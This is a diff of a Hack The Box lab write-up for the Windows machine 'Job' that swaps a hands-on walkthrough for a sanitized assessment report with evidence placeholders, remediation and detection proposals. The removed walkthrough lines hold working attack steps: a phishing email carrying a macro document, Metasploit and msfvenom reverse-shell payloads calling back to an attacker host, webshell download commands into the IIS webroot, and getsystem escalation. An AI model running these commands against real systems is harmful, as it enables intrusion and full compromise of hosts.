@@ -1,194 +1,100 @@
-<div align="center">
+# Job — Security Assessment
 
-# 💼 HTB: Job
+| Field | Value |
+| --- | --- |
+| Platform | Hack The Box |
+| Operating system | Windows |
+| Difficulty | Medium |
+| Assessment date | 2025-12-21 (from existing notes; timezone not recorded) |
+| Author | Dylan Senez / d4rkgunn3r |
+| Review status | Proposed revision; publication eligibility and evidence review pending |
 
-![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white)
-![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)
-![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
+## 1. Executive summary
 
-`hackthebox` `windows` `phishing` `libreoffice-macro` `iis-webroot` `seimpersonate` `printspoofer`
+The notes report document-driven execution as jack.black, execution under IIS through writable web content, and named-pipe impersonation producing SYSTEM.
 
-</div>
+## 2. Scope and authorization
 
----
+This account concerns the assigned HTB laboratory target only. Target addresses, VPN information, secrets, and flag contents are excluded. This revision analyzes recorded work; no assessment commands were executed during the editorial review. Machine retirement status has not been freshly verified.
 
-> **TL;DR** — An open SMTP relay delivers a malicious LibreOffice macro document straight to an internal mailbox, no auth required. Opening it hands over a shell. That user's group membership grants Full Control on the IIS webroot, so a webshell drop turns into code execution as the IIS AppPool — which has `SeImpersonatePrivilege` sitting there waiting for a Potato-style exploit to SYSTEM.
+## 3. Methodology and reproducibility
 
-## 📋 Box Info
+Discovery → service analysis → recorded access path → privilege/impact assessment → evidence review → remediation. Commands below support authorized discovery and identity verification. Exploitation is described at the finding level; operational payloads and secret-extraction procedures are omitted.
 
-| | |
-|---|---|
-| 🖥️ **OS** | Windows Server 2022 (build 10.0.20348) |
-| 🎯 **Target** | `<TARGET_IP>` (Job.local) |
-| 🎚️ **Difficulty** | Medium |
-| 📅 **Date** | December 21, 2025 |
-| 🏁 **Outcome** | ✅ Full compromise |
-
-## 🔍 Recon
+Set the address of the currently assigned lab instance before discovery:
 
 ```bash
-nmap -sV -sC -p- <TARGET_IP> -T4 --min-rate 5000
+export TARGET_IP='REPLACE_WITH_ASSIGNED_LAB_IP'
+mkdir -p evidence/job/{scans,screenshots}
+nmap -sV -p 25,80,445,3389,5985 -oA evidence/job/scans/services "$TARGET_IP"
 ```
 
-| Port | Service |
-|:---:|---|
-| `25` | hMailServer smtpd (AUTH LOGIN advertised) |
-| `80` | Microsoft IIS 10.0 |
-| `445` | SMB |
-| `3389` | RDP |
-| `5985` | WinRM |
+This is a proposed targeted confirmation command, not the original full-port scan. Nmap creates traffic and local output files. Record tool versions, instance date, and timezone; compare results with the observations below rather than assuming the same services are still present.
 
-Five services, no obvious single point of entry — but mail servers that accept unauthenticated relay plus a web server sharing the same box is a combination worth chasing.
+## 4. Reconnaissance and service analysis
 
----
+25 hMailServer; 80 IIS 10; 445 SMB; 3389 RDP; 5985 WinRM. A careers-page screenshot supports LibreOffice-document submission context.
 
-## 🚩 Shell as `jack.black` — Phishing via Open Relay
+> **EV-001 — Evidence placeholder:** add the reviewed service-scan excerpt and screenshot here. Remove sensitive identifiers. No screenshot file is claimed to exist at this placeholder.
 
-### The mail server doesn't check who's sending
+## 5. Recorded initial-access path
 
-```bash
-swaks --to career@job.local --from yourname@job.local --server <TARGET_IP> --port 25 \
-  --header "Subject: Job Application" --body "Please find my resume attached." \
-  --attach msf.odt
-```
+SMTP accepted a message for a local recipient. This does not prove external open relay. A callback and user context are reported after document processing; the reviewed screenshot does not establish who opened it, macro warning policy, or a particular LibreOffice CVE.
 
-```
--> MAIL FROM:yourname@job.local
-<- 250 OK
--> RCPT TO:career@job.local
-<- 250 OK
-<- 250 Queued
-```
+> **EV-002 — Evidence placeholder:** add a sanitized artifact establishing the behavior and resulting identity. An HTTP success response or tool success message alone does not prove code execution.
 
-> ⚠️ **Root cause:** the SMTP server delivers mail from any sender with zero verification (CWE-494 territory). Combined with a mail-opening human on the other end, that's a guaranteed-delivery phishing channel.
+## 6. Privilege escalation and impact validation
 
-### The payload
+The developers group reportedly had Full Control over IIS content. Execution in the application-pool context and an enabled impersonation privilege were followed by a recorded Meterpreter SYSTEM result. The notes do not establish a separately executed PrintSpoofer binary.
 
-```bash
-msfconsole
-use exploit/multi/misc/openoffice_document_macro
-set SRVHOST <ATTACKER_IP>
-set SRVPORT 1337
-set LHOST <ATTACKER_IP>
-run
-```
-
-This builds a malicious `.odt` with an embedded macro that, on open, downloads and runs a PowerShell payload from our HTTP server. The target's LibreOffice (7.2.x, October 2021 build) has macro execution enabled with no meaningful warning — vulnerable to the class of bug behind CVE-2017-9806.
-
-```bash
-nc -lvnp 53
-```
-
-Someone opens the attachment:
-
-```
-connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 55092
-PS C:\Program Files\LibreOffice\program>
-```
+In an already authorized session, record identity without reading objective contents:
 
 ```powershell
-PS C:\Users\jack.black\Desktop> type user.txt
-<USER_FLAG_REDACTED>
+whoami
+hostname
+whoami /priv
 ```
 
----
+These are proposed identity-verification commands, not a claim of rerunning the assessment. Windows privilege enumeration does not prove successful elevation; Linux sudo policy alone does not prove a root session.
 
-## 👑 Shell as `IIS AppPool\DefaultAppPool` → SYSTEM
+> **EV-003 — Evidence placeholder:** add policy/permission evidence and the resulting identity or access proof. Never include flags, tokens, private keys, hashes of credentials, or password values.
 
-### Group membership → webroot write access
+## 7. Evidence register and limitations
 
-```powershell
-PS> whoami /all
-job\jack.black
-JOB\developers  Alias
-```
+| ID | Required artifact | Current status |
+| --- | --- | --- |
+| EV-001 | Service inventory and timestamped scan excerpt | Text observations available; original artifact review pending |
+| EV-002 | Initial-access behavior and identity proof | Existing narrative reviewed; sanitized artifact pending |
+| EV-003 | Privilege boundary and impact proof | Reported in narrative; original artifact review pending |
 
-```powershell
-PS C:\inetpub\wwwroot> icacls .
-. JOB\developers:(OI)(CI)(F)
-```
+SYSTEM reported in text; careers screenshot alone does not establish exploitation.
 
-`jack.black` sits in `JOB\developers`, and that group has **Full Control** on the IIS web root. Web devs needing to deploy code is normal — giving them unrestricted write access to a live, internet-facing directory is not.
+The source is [the existing repository note](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/job.md), reviewed at blob SHA `46d63727ecf5edd900c955655765ca66244111ec`, plus [the repository source review](./EVIDENCE-REVIEW.md). The existing careers-page image supports document-submission context only; it still requires address-redaction review before reuse.
 
-### Webshell drop
+A Rooted status is not a substitute for a terminal transcript. Reported results are attributed to the existing notes; they have not been independently reproduced in this review. CVE numbers, fixed-version claims, unsupported timing claims, and numerical severity scores are withheld where primary-source verification is missing.
 
-```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f aspx -o evil.aspx
-```
+## 8. Findings and remediation
 
-```powershell
-PS C:\inetpub\wwwroot> powershell iwr <ATTACKER_IP>/evil.aspx -outfile "C:\inetpub\wwwroot\evil.aspx"
-```
+| ID | Finding / review target | Remediation |
+| --- | --- | --- |
+| F-001 | Document processing boundary | Use isolated document review, restricted macro policies, attachment screening, and current supported office software. |
+| F-002 | Excessive production webroot permissions | Deploy through controlled workflows; remove unnecessary write access and prohibit executable user uploads. |
+| F-003 | Service-context elevation | Restrict unnecessary privileges and services after compatibility review; harden service identities. |
 
-```bash
-rlwrap nc -lvnp 443
-```
+Prioritize the boundary failures that enable access or elevation. Set final severity after confirming prerequisites, affected privileges, and original evidence.
 
-Browsing to `evil.aspx` triggers it:
+## 9. Detection opportunities
 
-```
-c:\windows\system32\inetsrv>whoami
-iis apppool\defaultapppool
-```
+Office-to-shell process ancestry; IIS content writes and child processes; named-pipe/privilege activity. Tune against approved deployments and document automation.
 
-### The privilege that makes it all worthwhile
+Collect relevant application, authentication, process, and file-change logs. Correlate events by account, host, and time; a single suspicious request is not proof of successful compromise. These are detection proposals, not tested rules or observed telemetry.
 
-```
-c:\Users>whoami /priv
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled
-```
+## 10. Remediation validation
 
-> 💡 `SeImpersonatePrivilege` on a service account is the standard "Potato attack" setup — the account can impersonate any token it captures, which token-impersonation exploits (JuicyPotato, PrintSpoofer, RoguePotato, GodPotato) turn into SYSTEM.
+Verify corrected permissions and authentication/authorization policy using approved test accounts and administrative configuration review. Confirm exposed secrets were rotated and removed from distributed artifacts. Validate that legitimate workflows still function and monitoring captures permitted test activity. Preserve before/after evidence without exposing sensitive values.
 
-Stage a stable Meterpreter session from the IIS context and escalate:
+## 11. Lessons learned and remaining work
 
-```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=1597 -f exe -o evil.exe
-```
+Use observed identities and access results to establish impact. Keep service exposure separate from validated weaknesses and distinguish suggested methods from executed steps. Before publication, resolve the gaps in Sections 5–7, verify platform permission, and review every image and output for secrets.
 
-```powershell
-C:\Windows\Temp> powershell iwr <ATTACKER_IP>/evil.exe -outfile evil.exe
-C:\Windows\Temp> .\evil.exe
-```
-
-```
-meterpreter > getsystem
-...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
-```
-
-```
-meterpreter > cd C:\Users\Administrator\Desktop
-meterpreter > cat root.txt
-<ROOT_FLAG_REDACTED>
-```
-
----
-
-## ⏱️ Attack Timeline
-
-| Time (EST) | Action | Result |
-|---|---|---|
-| 10:21 | Full port scan | 5 services identified |
-| 10:32 | TRACE method check | Verified false positive, IIS returns 501 |
-| 11:15–11:19 | Phishing delivery via open SMTP relay | Payload downloaded, opened |
-| 11:16 | Reverse shell callback | Shell as `jack.black`, user flag captured |
-| 11:20–11:25 | Webroot ACL discovery + webshell upload | Shell as `IIS AppPool\DefaultAppPool` |
-| 11:30–11:34 | Meterpreter upload + `getsystem` | SYSTEM, root flag captured |
-
-## 🛠️ Remediation
-
-| Finding | Fix |
-|---|---|
-| Open SMTP relay | Require authentication for mail submission; deploy SPF/DKIM/DMARC. |
-| Macro execution enabled by default | Set LibreOffice/Office macro security to highest level; filter executable content from attachments at the gateway. |
-| `developers` group Full Control on live webroot | Deploy via CI/CD pipeline, not direct write access; grant read-only to devs on production paths. |
-| `SeImpersonatePrivilege` on IIS AppPool | Disable where not strictly required; monitor for token-impersonation exploitation patterns. |
-| SMB signing enabled but not required | Enforce via GPO — mitigates relay attacks on top of everything else. |
-
----
-
-<div align="center">
-
-*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*
-
-</div>
+[Back to walkthrough inventory](./README.md)
